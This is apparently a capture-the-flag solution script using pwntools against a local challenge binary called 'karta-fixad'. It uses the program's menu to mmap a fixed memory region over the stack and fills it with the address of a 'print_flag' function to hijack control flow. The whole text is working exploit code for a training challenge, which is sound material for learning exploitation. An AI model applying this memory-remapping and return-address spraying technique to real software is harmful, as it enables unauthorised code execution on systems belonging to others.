from pwn import *


prog = ELF("./karta-fixad")
p = remote("127.0.0.1", 50000) #process("./karta-fixad")


def mmap(addr, length, prot, flags, fd, offset):
    p.sendlineafter(">", "1")
    p.sendlineafter(":", str(addr))
    p.sendlineafter(":", str(length))
    p.sendlineafter(":", str(prot))
    p.sendlineafter(":", str(flags))
    p.sendlineafter(":", str(fd))
    p.sendlineafter(":", str(offset))
    return int(p.recvline(), 16)

def write(data):
    p.sendlineafter(">", "2")
    p.sendlineafter("?", str(len(data)))
    p.send(data)


def mapping():
    p.sendlineafter(">", "3")
    return p.recvuntil("1. mmap").decode()


print (mapping())
stack = int(input(":"), 16) + 0x1f000 - 0x2000

addr = mmap(stack, 0x1000, 7, \
    constants.MAP_FIXED | constants.MAP_PRIVATE | constants.MAP_ANONYMOUS, -1, 0)

write(p64(prog.symbols['print_flag']) * (0x4000//8))



p.interactive()
